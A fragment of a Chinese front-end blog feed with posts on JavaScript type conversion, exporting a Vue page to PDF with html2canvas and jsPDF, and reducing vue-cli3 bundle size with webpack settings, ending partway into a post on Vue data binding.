    <content type="html"><![CDATA[<p>JavaScript目前有七种数据类型，分别是Undefined，NaN，Boolean，Number，Symbol，String，Object。它们之间存在隐形转换。<br><a id="more"></a></p><h2 id="类型转换问题"><a href="#类型转换问题" class="headerlink" title="类型转换问题"></a>类型转换问题</h2><p>因为js是弱语言类型，所以类型转换很频繁，按照个人思维去直觉判断就会出现问题，最臭名昭著的就是“==”转换，因为其跨类型转换，其复杂规则是很难全记住的，所以往往要求通过显示转换后，在通过“===”比较。</p><p>大多数类型的规则如下</p><p><img src="../images/type_conversion.jpg" alt="type_conversion.jpg"></p><h2 id="StringToNumber"><a href="#StringToNumber" class="headerlink" title="StringToNumber"></a>StringToNumber</h2><p>推荐使用Number转换。</p><p>关于parseInt、parseFloat，需要注意的是，es5后默认为第二参数转换为十进制，废除不传参数时，es3允许的0开头的八进制转换，目前为</p><ul><li>0b11</li><li>0o17</li><li>0xff</li></ul><p>对于<code>1e3</code>这一类的转换，parseInt只会支持整数，无视e及其之后的数字。</p><h2 id="NumberToString"><a href="#NumberToString" class="headerlink" title="NumberToString"></a>NumberToString</h2><p>完全符合你的直觉，很少用到。</p><h2 id="装箱转换"><a href="#装箱转换" class="headerlink" title="装箱转换"></a>装箱转换</h2><p>基础类型中Number，Boolean，Symbol，String在对象中有相应的类。将基础类型转换为相应对象为装箱。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> symbolObject = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>; &#125;).call(<span class="built_in">Symbol</span>(<span class="string">"a"</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> symbolObject); <span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(symbolObject <span class="keyword">instanceof</span> <span class="built_in">Symbol</span>); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(symbolObject.constructor == <span class="built_in">Symbol</span>); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> symbolObject = <span class="built_in">Object</span>(<span class="built_in">Symbol</span>(<span class="string">"a"</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> symbolObject); <span class="comment">//object</span></span><br><span class="line"><span class="built_in">console</span>.log(symbolObject <span class="keyword">instanceof</span> <span class="built_in">Symbol</span>); <span class="comment">//true</span></span><br><span class="line"><span class="built_in">console</span>.log(symbolObject.constructor == <span class="built_in">Symbol</span>); <span class="comment">//true</span></span><br></pre></td></tr></table></figure><h2 id="拆箱转换"><a href="#拆箱转换" class="headerlink" title="拆箱转换"></a>拆箱转换</h2><p>在 JavaScript 标准中，定了 ToPrimitive 函数，它是对象类型到基本类型的转换。</p><p>对象到String、Number先拆在转换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Obj==&gt;Number</span></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    valueOf : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"valueOf"</span>); <span class="keyword">return</span> &#123;&#125;&#125;,</span><br><span class="line">    toString : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"toString"</span>); <span class="keyword">return</span> &#123;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">o * <span class="number">2</span></span><br><span class="line"><span class="comment">// valueOf</span></span><br><span class="line"><span class="comment">// toString</span></span><br><span class="line"><span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Obj==&gt;String</span></span><br><span class="line"><span class="keyword">var</span> o = &#123;</span><br><span class="line">    valueOf : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"valueOf"</span>); <span class="keyword">return</span> &#123;&#125;&#125;,</span><br><span class="line">    toString : <span class="function"><span class="params">()</span> =&gt;</span> &#123;<span class="built_in">console</span>.log(<span class="string">"toString"</span>); <span class="keyword">return</span> &#123;&#125;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">String</span>(o)</span><br><span class="line"><span class="comment">// toString</span></span><br><span class="line"><span class="comment">// valueOf</span></span><br><span class="line"><span class="comment">// TypeError</span></span><br></pre></td></tr></table></figure><p>参考链接 <a href="https://time.geekbang.org/column/article/78884" target="_blank" rel="noopener">https://time.geekbang.org/column/article/78884</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;JavaScript目前有七种数据类型，分别是Undefined，NaN，Boolean，Number，Symbol，String，Object。它们之间存在隐形转换。&lt;br&gt;
    
    </summary>
    
      <category term="js" scheme="https://luckyp.top/categories/js/"/>
    
    
      <category term="String" scheme="https://luckyp.top/tags/String/"/>
    
      <category term="Number" scheme="https://luckyp.top/tags/Number/"/>
    
      <category term="转换" scheme="https://luckyp.top/tags/%E8%BD%AC%E6%8D%A2/"/>
    
  </entry>
  
  <entry>
    <title>vue导出PDF</title>
    <link href="https://luckyp.top/vue%E5%AF%BC%E5%87%BAPDF/"/>
    <id>https://luckyp.top/vue导出PDF/</id>
    <published>2019-01-12T16:00:00.000Z</published>
    <updated>2019-01-12T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>新需求需要导出当前页面为PDF，通过Google找到了前端就可实现的一种导出方式。<br><a id="more"></a></p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一个将页面html转换成图片</span></span><br><span class="line">npm install html2canvas --save</span><br><span class="line"><span class="comment">// 第二个将图片生成pdf</span></span><br><span class="line">npm install jspdf --save</span><br></pre></td></tr></table></figure><h2 id="封装组件"><a href="#封装组件" class="headerlink" title="封装组件"></a>封装组件</h2><p>创建<code>htmlToPdf.js</code>,看个人习惯，本例放在<code>src/utils/htmlToPdf.js</code>,将其注册为插件。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 导出页面为PDF格式</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> html2Canvas <span class="keyword">from</span> <span class="string">'html2canvas'</span></span><br><span class="line"><span class="keyword">import</span> JsPDF <span class="keyword">from</span> <span class="string">'jspdf'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  执行方式  参数 (导出的容器id,导出pdf文件名 )</span></span><br><span class="line"><span class="comment">  &lt;button @click="getPdf('#pdfDom','test')"&gt;导出&lt;/button&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">const</span> htmlToPdf = &#123;</span><br><span class="line">  install (Vue, options) &#123;</span><br><span class="line">    Vue.prototype.getPdf = <span class="function"><span class="keyword">function</span> (<span class="params">id,pdfTitle</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> title = pdfTitle</span><br><span class="line">      html2Canvas(<span class="built_in">document</span>.querySelector(id), &#123;</span><br><span class="line">        allowTaint: <span class="literal">true</span>,</span><br><span class="line">        logging: <span class="literal">false</span></span><br><span class="line">      &#125;).then(<span class="function"><span class="keyword">function</span> (<span class="params">canvas</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">let</span> contentWidth = canvas.width</span><br><span class="line">        <span class="keyword">let</span> contentHeight = canvas.height</span><br><span class="line">        <span class="keyword">let</span> pageHeight = contentWidth / <span class="number">592.28</span> * <span class="number">841.89</span></span><br><span class="line">        <span class="keyword">let</span> leftHeight = contentHeight</span><br><span class="line">        <span class="keyword">let</span> position = <span class="number">0</span></span><br><span class="line">        <span class="keyword">let</span> imgWidth = <span class="number">595.28</span></span><br><span class="line">        <span class="keyword">let</span> imgHeight = <span class="number">592.28</span> / contentWidth * contentHeight</span><br><span class="line">        <span class="keyword">let</span> pageData = canvas.toDataURL(<span class="string">'image/jpeg'</span>, <span class="number">1.0</span>)</span><br><span class="line">        <span class="keyword">let</span> PDF = <span class="keyword">new</span> JsPDF(<span class="string">''</span>, <span class="string">'pt'</span>, <span class="string">'a4'</span>)</span><br><span class="line">        <span class="keyword">if</span> (leftHeight &lt; pageHeight) &#123;</span><br><span class="line">          PDF.addImage(pageData, <span class="string">'JPEG'</span>, <span class="number">0</span>, <span class="number">0</span>, imgWidth, imgHeight)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">while</span> (leftHeight &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            PDF.addImage(pageData, <span class="string">'JPEG'</span>, <span class="number">0</span>, position, imgWidth, imgHeight)</span><br><span class="line">            leftHeight -= pageHeight</span><br><span class="line">            position -= <span class="number">841.89</span></span><br><span class="line">            <span class="keyword">if</span> (leftHeight &gt; <span class="number">0</span>) &#123;</span><br><span class="line">              PDF.addPage()</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        PDF.save(title + <span class="string">'.pdf'</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Vue.use(htmlToPdf)</span><br></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>在当前项目入口文件，本例为当前<code>vue-cli3</code>入口文件为<code>main.js</code>引入,<code>@</code>指的当前src目录，通过<code>webpack</code>可自定义其它快捷。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'@/utils/htmlToPdf'</span></span><br></pre></td></tr></table></figure><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="html使用"><a href="#html使用" class="headerlink" title="html使用"></a>html使用</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  参数 (导出的容器id,导出pdf文件名 ) --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">"getPdf('#pdfDom','test')"</span>&gt;</span>导出<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="js使用"><a href="#js使用" class="headerlink" title="js使用"></a>js使用</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.getPdf(<span class="string">'#pdfDom'</span>,<span class="string">'test'</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;新需求需要导出当前页面为PDF，通过Google找到了前端就可实现的一种导出方式。&lt;br&gt;
    
    </summary>
    
      <category term="js" scheme="https://luckyp.top/categories/js/"/>
    
    
      <category term="vue" scheme="https://luckyp.top/tags/vue/"/>
    
      <category term="pdf" scheme="https://luckyp.top/tags/pdf/"/>
    
  </entry>
  
  <entry>
    <title>vue-cli3打包</title>
    <link href="https://luckyp.top/vue-cli3%E6%89%93%E5%8C%85/"/>
    <id>https://luckyp.top/vue-cli3打包/</id>
    <published>2018-11-20T16:00:00.000Z</published>
    <updated>2018-11-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近通过vue-cli3配置项目的时候，对于引入的ElementUI或者测试使用的jQuery等第三方包，存在打包之后，app.js文件过大的问题。解决的方案目前看来存在两种方式。<br><a id="more"></a></p><p>在vue-cli3不存在暴露的接口文件，需要通过<code>vue.config.js</code>配置来使用,展示的均为vue-cli3。vue-cli2类似，区别在于可在暴露的配置文件中直接添加。</p><h2 id="webpack-bundle-analyzer"><a href="#webpack-bundle-analyzer" class="headerlink" title="webpack-bundle-analyzer"></a>webpack-bundle-analyzer</h2><p>用于显示打包之后的文件分析其大小.</p><p>安装<code>npm install –save-dev webpack-bundle-analyzer</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js文件</span></span><br><span class="line"><span class="keyword">const</span> BundleAnalyzerPlugin = <span class="built_in">require</span>(<span class="string">'webpack-bundle-analyzer'</span>).BundleAnalyzerPlugin;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    <span class="comment">// configureWebpack返回一个对象，会被 webpack-merge合并最终配置</span></span><br><span class="line">    configureWebpack: <span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">'production'</span>) &#123;</span><br><span class="line">            <span class="comment">// 为生产环境修改配置...</span></span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                plugins: [</span><br><span class="line">                    <span class="keyword">new</span> BundleAnalyzerPlugin(</span><br><span class="line">                        <span class="comment">//  可以是`server`，`static`或`disabled`。</span></span><br><span class="line">                        <span class="comment">//  在`server`模式下，分析器将启动HTTP服务器来显示软件包报告。</span></span><br><span class="line">                        <span class="comment">//  在“静态”模式下，会生成带有报告的单个HTML文件。</span></span><br><span class="line">                        <span class="comment">//  在`disabled`模式下，你可以使用这个插件来将`generateStatsFile`设置为`true`来生成Webpack Stats JSON文件。</span></span><br><span class="line">                        analyzerMode: <span class="string">'server'</span>,</span><br><span class="line">                        <span class="comment">//  将在“服务器”模式下使用的主机启动HTTP服务器。</span></span><br><span class="line">                        analyzerHost: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">                        <span class="comment">//  将在“服务器”模式下使用的端口启动HTTP服务器。</span></span><br><span class="line">                        analyzerPort: <span class="number">8888</span>,</span><br><span class="line">                        <span class="comment">//  路径捆绑，将在`static`模式下生成的报告文件。</span></span><br><span class="line">                        <span class="comment">//  相对于捆绑输出目录。</span></span><br><span class="line">                        reportFilename: <span class="string">'report.html'</span>,</span><br><span class="line">                        <span class="comment">//  模块大小默认显示在报告中。</span></span><br><span class="line">                        <span class="comment">//  应该是`stat`，`parsed`或者`gzip`中的一个。</span></span><br><span class="line">                        <span class="comment">//  有关更多信息，请参见“定义”一节。</span></span><br><span class="line">                        defaultSizes: <span class="string">'parsed'</span>,</span><br><span class="line">                        <span class="comment">//  在默认浏览器中自动打开报告</span></span><br><span class="line">                        openAnalyzer: <span class="literal">true</span>,</span><br><span class="line">                        <span class="comment">//  如果为true，则Webpack Stats JSON文件将在bundle输出目录中生成</span></span><br><span class="line">                        generateStatsFile: <span class="literal">false</span>,</span><br><span class="line">                        <span class="comment">//  如果`generateStatsFile`为`true`，将会生成Webpack Stats JSON文件的名字。</span></span><br><span class="line">                        <span class="comment">//  相对于捆绑输出目录。</span></span><br><span class="line">                        statsFilename: <span class="string">'stats.json'</span>,</span><br><span class="line">                        <span class="comment">//  stats.toJson（）方法的选项。</span></span><br><span class="line">                        <span class="comment">//  例如，您可以使用`source：false`选项排除统计文件中模块的来源。</span></span><br><span class="line">                        <span class="comment">//  在这里查看更多选项：https：  //github.com/webpack/webpack/blob/webpack-1/lib/Stats.js#L21</span></span><br><span class="line">                        statsOptions: <span class="literal">null</span>,</span><br><span class="line">                        logLevel: <span class="string">'info'</span> <span class="comment">//日志级别。可以是'信息'，'警告'，'错误'或'沉默'。</span></span><br><span class="line">                    )</span><br><span class="line">                ]</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 为开发环境修改配置...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认在打包或者运行server时，接口8888为图像界面。</p><h2 id="通过externals"><a href="#通过externals" class="headerlink" title="通过externals"></a>通过externals</h2><p>webpack文档<a href="https://webpack.docschina.org/configuration/externals" target="_blank" rel="noopener">https://webpack.docschina.org/configuration/externals</a>有简单的介绍。<br>简单来说就是</p><h3 id="1-添加cdn"><a href="#1-添加cdn" class="headerlink" title="1.添加cdn"></a>1.添加cdn</h3><p>在模板页面<code>index.html</code>中添加CDN链接，举例jQuery。<br><code>&lt;script src=&quot;https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js&quot;&gt;&lt;/script&gt;</code></p><h3 id="2-设置externals"><a href="#2-设置externals" class="headerlink" title="2.设置externals"></a>2.设置externals</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js文件</span></span><br><span class="line"><span class="keyword">const</span> BundleAnalyzerPlugin = <span class="built_in">require</span>(<span class="string">'webpack-bundle-analyzer'</span>).BundleAnalyzerPlugin;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    configureWebpack: <span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">'production'</span>) &#123;</span><br><span class="line">            <span class="comment">// 为生产环境修改配置...</span></span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                plugins: [</span><br><span class="line">                    <span class="keyword">new</span> BundleAnalyzerPlugin()</span><br><span class="line">                ],</span><br><span class="line">                externals:&#123;</span><br><span class="line">                    <span class="string">'jquery'</span>: <span class="string">'jQuery'</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 为开发环境修改配置...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-关于开发时引用"><a href="#3-关于开发时引用" class="headerlink" title="3.关于开发时引用"></a>3.关于开发时引用</h3><p>可以通过下面代码引用，此时（上例设置为生产环境时）不会被webpack打包。同时可以引用使用。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> $ <span class="keyword">from</span> <span class="string">'jquery'</span>;</span><br></pre></td></tr></table></figure><h2 id="通过splitChunks"><a href="#通过splitChunks" class="headerlink" title="通过splitChunks"></a>通过splitChunks</h2><p>上一种方式是通过cdn加速，这种是通过拆分Chunk的方式。<br>webpac中文文档地址<a href="https://webpack.docschina.org/plugins/split-chunks-plugin/" target="_blank" rel="noopener">https://webpack.docschina.org/plugins/split-chunks-plugin/</a>，webpack4默认删除<code>CommonsChunkPlugin</code>。直接上代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue.config.js文件</span></span><br><span class="line"><span class="keyword">const</span> BundleAnalyzerPlugin = <span class="built_in">require</span>(<span class="string">'webpack-bundle-analyzer'</span>).BundleAnalyzerPlugin;</span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">    configureWebpack: <span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (process.env.NODE_ENV === <span class="string">'production'</span>) &#123;</span><br><span class="line">            <span class="comment">// 为生产环境修改配置...</span></span><br><span class="line">            <span class="keyword">return</span> &#123;</span><br><span class="line">                optimization:&#123;</span><br><span class="line">                    splitChunks:&#123;</span><br><span class="line">                        cacheGroups: &#123;</span><br><span class="line">                            libs: &#123;</span><br><span class="line">                                name: <span class="string">"chunk-libs"</span>,<span class="comment">// 只打包初始时依赖的第三方</span></span><br><span class="line">                                test: <span class="regexp">/[\\/]node_modules[\\/]/</span>,</span><br><span class="line">                                priority: <span class="number">10</span>,</span><br><span class="line">                                chunks: <span class="string">"initial"</span></span><br><span class="line">                            &#125;,</span><br><span class="line">                            elementUI: &#123;</span><br><span class="line">                                name: <span class="string">"chunk-elementUI"</span>, <span class="comment">// 单独将 elementUI 拆包</span></span><br><span class="line">                                priority: <span class="number">20</span>, <span class="comment">// 权重要大于 libs 和 app 不然会被打包进 libs 或者 app</span></span><br><span class="line">                                test: <span class="regexp">/[\\/]node_modules[\\/]element-ui[\\/]/</span>,</span><br><span class="line">                                chunks: <span class="string">"all"</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    runtimeChunk: <span class="literal">true</span></span><br><span class="line">                    &#125;,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 为开发环境修改配置...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考链接<br>vue-cli2参考<a href="https://blog.csdn.net/LY_never_cease/article/details/81333093" target="_blank" rel="noopener">https://blog.csdn.net/LY_never_cease/article/details/81333093</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近通过vue-cli3配置项目的时候，对于引入的ElementUI或者测试使用的jQuery等第三方包，存在打包之后，app.js文件过大的问题。解决的方案目前看来存在两种方式。&lt;br&gt;
    
    </summary>
    
      <category term="工具" scheme="https://luckyp.top/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="脚手架" scheme="https://luckyp.top/tags/%E8%84%9A%E6%89%8B%E6%9E%B6/"/>
    
      <category term="vue" scheme="https://luckyp.top/tags/vue/"/>
    
      <category term="webpack" scheme="https://luckyp.top/tags/webpack/"/>
    
  </entry>
  
  <entry>
    <title>vue数据双向绑定</title>
    <link href="https://luckyp.top/vue%E6%95%B0%E6%8D%AE%E5%8F%8C%E5%90%91%E7%BB%91%E5%AE%9A/"/>
    <id>https://luckyp.top/vue数据双向绑定/</id>
    <published>2018-08-06T16:00:00.000Z</published>
    <updated>2018-08-06T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间的react项目，通过最近的闲暇时间，重构了一版<a href="http://luckyp.top/vue-cnode/">vue的PC版本</a>，<a href="https://vcnode.luckyp.top/" target="_blank" rel="noopener">备用链接</a>,对于vue的数据双向绑定产生，探讨一下。</p><a id="more"></a><h2 id="几种绑定方式"><a href="#几种绑定方式" class="headerlink" title="几种绑定方式"></a>几种绑定方式</h2><h3 id="发布者-订阅者模式（backbone-js）"><a href="#发布者-订阅者模式（backbone-js）" class="headerlink" title="发布者-订阅者模式（backbone.js）"></a>发布者-订阅者模式（backbone.js）</h3><p>通过自定义的data属性在HTML代码中指明绑定。所有绑定起来的JavaScript对象以及DOM元素都将“订阅”一个发布者对象。任何时候如果JavaScript对象或者一个HTML输入字段被侦测到发生了变化，我们将代理事件到发布者-订阅者模式，这会反过来将变化广播并传播到所有绑定的对象和元素。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">data-bind-123</span>=<span class="string">"name"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>  <span class="attr">data-bind-123</span>=<span class="string">"name"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">DataBinder</span>(<span class="params">object_id</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//创建一个简单地PubSub对象</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> pubSub = &#123;</span></span><br><span class="line">        callbacks: &#123;&#125;,</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// 